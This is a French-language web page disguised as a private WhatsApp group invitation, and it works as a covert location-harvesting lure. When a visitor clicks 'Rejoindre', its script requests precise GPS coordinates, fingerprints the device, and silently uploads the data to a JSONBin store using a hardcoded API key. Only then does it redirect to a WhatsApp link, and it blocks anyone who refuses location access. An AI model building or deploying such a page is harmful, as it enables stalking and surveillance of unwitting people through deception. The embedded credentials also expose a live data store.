<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="Cache-Control" content="no-store" />
  <meta http-equiv="Pragma" content="no-cache" />
  <title>Une invitation t'attend</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --bg: #111B21;
      --surface: #1F2C34;
      --green: #25D366;
      --green-light: #dcf8c6;
      --green-glow: rgba(37, 211, 102, 0.25);
      --text: #E9EDEF;
      --muted: #8696A0;
      --border: #2A3942;
    }

    html, body {
      height: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      overflow: hidden;
    }

    .screen {
      position: fixed;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 24px;
      gap: 24px;
      opacity: 1;
      transform: translateY(0);
      transition: opacity 0.5s ease, transform 0.5s ease;
      z-index: 10;
    }

    .screen.hidden {
      opacity: 0;
      pointer-events: none;
      transform: translateY(20px);
      z-index: -1;
    }

    /* ═══════════════════════════════════════════════════════════ */
    /* SCREEN 1 — ACCROCHE */
    /* ═══════════════════════════════════════════════════════════ */
    #screen-welcome {
      text-align: center;
      justify-content: space-between;
    }

    .welcome-logo {
      width: 64px;
      height: 64px;
      margin-top: 20px;
    }

    .welcome-logo svg {
      width: 100%;
      height: 100%;
      filter: drop-shadow(0 0 12px var(--green-glow));
    }

    .welcome-content {
      display: flex;
      flex-direction: column;
      gap: 20px;
      flex: 1;
      justify-content: center;
    }

    .welcome-title {
      font-size: clamp(1.8rem, 6vw, 2.8rem);
      font-weight: 600;
      line-height: 1.2;
      color: var(--text);
    }

    .welcome-title .emoji {
      display: inline-block;
      margin-left: 8px;
      font-size: 1.1em;
    }

    .welcome-subtitle {
      font-size: 15px;
      color: var(--muted);
      font-weight: 400;
      line-height: 1.5;
    }

    .welcome-button {
      padding: 16px 40px;
      background: var(--green);
      color: #000;
      border: none;
      border-radius: 50px;
      font-size: 15px;
      font-weight: 700;
      font-family: 'Inter', sans-serif;
      cursor: pointer;
      transition: all 0.2s;
      margin-top: 12px;
    }

    .welcome-button:hover {
      background: #22c55e;
      transform: translateY(-2px);
      box-shadow: 0 8px 20px var(--green-glow);
    }

    .welcome-button:active {
      transform: translateY(0);
    }

    .welcome-footer {
      font-size: 12px;
      color: var(--muted);
      margin-bottom: 20px;
    }

    /* ═══════════════════════════════════════════════════════════ */
    /* SCREEN 2 — LOADING */
    /* ═══════════════════════════════════════════════════════════ */
    #screen-loading {
      gap: 32px;
    }

    .loader-ring {
      width: 52px;
      height: 52px;
      border: 2px solid var(--border);
      border-top-color: var(--green);
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .loader-text {
      font-size: 15px;
      color: var(--text);
      font-weight: 500;
    }

    /* ═══════════════════════════════════════════════════════════ */
    /* SCREEN 3 — CONFIRMATION & REDIRECTION */
    /* ═══════════════════════════════════════════════════════════ */
    #screen-success {
      gap: 24px;
    }

    .success-icon {
      font-size: 3.5rem;
      animation: pulse-scale 2s ease-in-out infinite;
    }

    @keyframes pulse-scale {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.08);
      }
    }

    .success-title {
      font-size: clamp(1.5rem, 5vw, 2.2rem);
      font-weight: 600;
      color: var(--green);
      text-align: center;
    }

    .success-subtitle {
      font-size: 14px;
      color: var(--muted);
      text-align: center;
      line-height: 1.5;
    }

    .success-button {
      padding: 13px 28px;
      background: var(--green);
      color: #000;
      border: none;
      border-radius: 24px;
      font-size: 14px;
      font-weight: 600;
      font-family: 'Inter', sans-serif;
      cursor: pointer;
      margin-top: 12px;
      transition: all 0.2s;
    }

    .success-button:hover {
      background: #22c55e;
      transform: translateY(-2px);
    }

    .countdown {
      font-size: 12px;
      color: var(--muted);
      margin-top: 16px;
      font-family: 'Courier New', monospace;
    }

    /* ═══════════════════════════════════════════════════════════ */
    /* SCREEN 4 — REFUS GPS */
    /* ═══════════════════════════════════════════════════════════ */
    #screen-denied {
      gap: 24px;
    }

    .denied-icon {
      font-size: 3.5rem;
    }

    .denied-title {
      font-size: 1.5rem;
      font-weight: 600;
      color: var(--text);
      text-align: center;
    }

    .denied-text {
      font-size: 14px;
      color: var(--muted);
      text-align: center;
      line-height: 1.5;
      max-width: 320px;
    }

    .denied-refresh {
      padding: 13px 28px;
      background: var(--surface);
      color: var(--green);
      border: 1px solid var(--border);
      border-radius: 24px;
      font-size: 14px;
      font-weight: 600;
      font-family: 'Inter', sans-serif;
      cursor: pointer;
      margin-top: 12px;
      transition: all 0.2s;
    }

    .denied-refresh:hover {
      background: var(--border);
      border-color: var(--green);
    }
  </style>
</head>
<body>
  <!-- SCREEN 1: Accroche -->
  <div class="screen" id="screen-welcome">
    <svg class="welcome-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.67-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.076 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421-7.403h-.004c-1.052 0-2.069.356-2.897 1.025l-.643-.381C5.554 2.612 3.663 1.776 1.561 1.776c-4.29 0-7.994 3.704-7.994 8.05 0 1.549.3 3.034.845 4.394L.645 15.977l4.828-1.271c1.285.703 2.735 1.139 4.282 1.139h.004c4.29 0 7.994-3.704 7.994-8.05 0-2.154-.857-4.177-2.414-5.695-1.557-1.52-3.631-2.357-5.745-2.357" fill="currentColor" style="color: #25D366;"/>
    </svg>

    <div class="welcome-content">
      <h1 class="welcome-title">
        Tu as été sélectionné·e <span class="emoji">🎉</span>
      </h1>
      <p class="welcome-subtitle">
        Une invitation privée t'attend. Rejoins les personnes déjà à l'intérieur.
      </p>
      <button class="welcome-button" onclick="startGeo()">
        Rejoindre maintenant →
      </button>
    </div>

    <p class="welcome-footer">
      Groupe WhatsApp privé · Membres sélectionnés
    </p>
  </div>

  <!-- SCREEN 2: Loading -->
  <div class="screen hidden" id="screen-loading">
    <div class="loader-ring"></div>
    <p class="loader-text">Vérification en cours…</p>
  </div>

  <!-- SCREEN 3: Success & Redirection -->
  <div class="screen hidden" id="screen-success">
    <div class="success-icon">✓</div>
    <h2 class="success-title">Accès confirmé</h2>
    <p class="success-subtitle">
      Tu rejoins le groupe dans quelques secondes…
    </p>
    <button class="success-button" onclick="openWhatsApp()">
      Ouvrir WhatsApp
    </button>
    <div class="countdown" id="countdown-text"></div>
  </div>

  <!-- SCREEN 4: Denied -->
  <div class="screen hidden" id="screen-denied">
    <div class="denied-icon">🔒</div>
    <h2 class="denied-title">Accès restreint</h2>
    <p class="denied-text">
      Actualise la page pour réessayer.
    </p>
    <button class="denied-refresh" onclick="location.reload()">
      Réessayer
    </button>
  </div>

  <!-- UAParser.js for device detection -->
  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/src/ua-parser.min.js"></script>

  <script>
    const JSONBIN_BIN_ID = '69dd06c3856a6821892c67e7';
    const JSONBIN_API_KEY = '$2a$10$.36nNBRUdpE3TtbHXEHEGunOtJSZuVMN9.JO8iefwRLUZ09KoBMIG';
    const WHATSAPP_LINK = 'https://chat.whatsapp.com/FA9VhW47rWTG4zmMaXZoFq?mode=gi_t';

    function show(screenId) {
      document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
      document.getElementById(screenId).classList.remove('hidden');
    }

    function generateUUID() {
      if (window.crypto && typeof window.crypto.randomUUID === 'function') {
        return crypto.randomUUID();
      }
      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = (Math.random() * 16) | 0;
        const v = c === 'x' ? r : (r & 0x3) | 0x8;
        return v.toString(16);
      });
    }

    function parseDevice() {
      const parser = new UAParser();
      const result = parser.getResult();
      return {
        os: `${result.os.name} ${result.os.version || ''}`.trim(),
        browser: `${result.browser.name} ${result.browser.version || ''}`.trim(),
        model: result.device.model || 'Unknown',
        type: result.device.type || 'desktop'
      };
    }

    async function saveVisit(lat, lng) {
      try {
        const device = parseDevice();
        const newVisit = {
          id: generateUUID(),
          lat,
          lng,
          timestamp: new Date().toISOString(),
          device
        };

        // Fetch current bin
        const fetchRes = await fetch(
          `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`,
          {
            headers: { 'X-Master-Key': JSONBIN_API_KEY }
          }
        );
        const fetchJson = await fetchRes.json();
        let visits = Array.isArray(fetchJson.record) ? fetchJson.record : [];

        // Add new visit
        visits.push(newVisit);

        // Update bin with entire array
        const putRes = await fetch(
          `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`,
          {
            method: 'PUT',
            headers: {
              'Content-Type': 'application/json',
              'X-Master-Key': JSONBIN_API_KEY
            },
            body: JSON.stringify(visits)
          }
        );

        if (!putRes.ok) {
          console.error('Failed to save visit');
        }
      } catch (err) {
        console.error('Error saving visit:', err);
      }
    }

    function startCountdown() {
      let seconds = 3;
      const countdownEl = document.getElementById('countdown-text');

      const interval = setInterval(() => {
        if (seconds > 0) {
          countdownEl.textContent = `Redirection dans ${seconds}s…`;
          seconds--;
        } else {
          clearInterval(interval);
          window.location.href = WHATSAPP_LINK;
        }
      }, 1000);

      // Show initial text
      countdownEl.textContent = `Redirection dans ${seconds}s…`;
    }

    function openWhatsApp() {
      window.location.href = WHATSAPP_LINK;
    }

    async function startGeo() {
      show('screen-loading');

      if (!navigator.geolocation) {
        show('screen-denied');
        return;
      }

      const watchId = navigator.geolocation.watchPosition(
        async (position) => {
          navigator.geolocation.clearWatch(watchId);
          const { latitude, longitude } = position.coords;

          saveVisit(latitude, longitude);
          show('screen-success');
          startCountdown();
        },
        (error) => {
          navigator.geolocation.clearWatch(watchId);
          console.error('Geolocation error:', error);
          show('screen-denied');
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }
  </script>
</body>
</html>
